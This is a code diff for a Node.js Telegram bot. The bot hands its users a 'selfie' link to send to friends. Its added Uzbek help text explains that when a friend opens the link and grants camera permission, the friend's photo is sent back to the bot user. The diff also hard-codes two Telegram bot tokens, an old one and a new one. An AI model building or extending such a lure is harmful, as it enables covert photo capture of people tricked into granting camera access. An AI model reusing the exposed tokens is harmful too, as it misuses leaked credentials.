@@ -10,7 +10,7 @@ const app = express();
 const PORT = process.env.PORT || 3000;
 
 // Bot token
-const TOKEN = "8201270787:AAELpFwtJ7IYefjAIUtxEv39kyuU-jcbo2Y";
+const TOKEN = "8438381311:AAH5T96S7xWkdbkUDohByM2rS4t6tQOdPqA";
 const BASE_URL = "https://korish.onrender.com"; // Render'dagi sayt noming
 
 // Webhook bilan botni sozlaymiz
@@ -51,8 +51,15 @@ bot.on("message", (msg) => {
     const url = `${BASE_URL}/selfie/${chatId}`;
     bot.sendMessage(
       chatId,
-      `📷 Rasm olish uchun quyidagi havolani bosing:\n${url}`
+      `📷 Rasm olish uchun quyidagi havolani bosing:\n\n${url}`
     );
+  }
+  if (text === "🆘 Yordam") {
+    bot.sendMessage(
+      chatId,
+      "Shunchaki 📸 Rasm olish tugmasni bosing berilgan linki dostingizga jonating. Agar dostinggiz linga kirib kamera ruxsatiga rozilik bildirsa sizga uning rasmi yuboriladi.\n\nFaqat to'gri yo'lda foydalaning."
+    );
+    bot.sendAudio(chatId, "music/koryabman.mp3");
   }
 });
 
@@ -64,4 +71,3 @@ app.get("/selfie/:id", (req, res) => {
 app.listen(PORT, () => {
   console.log(`✅ Server ishga tushdi: ${BASE_URL} (PORT: ${PORT})`);
 });
-
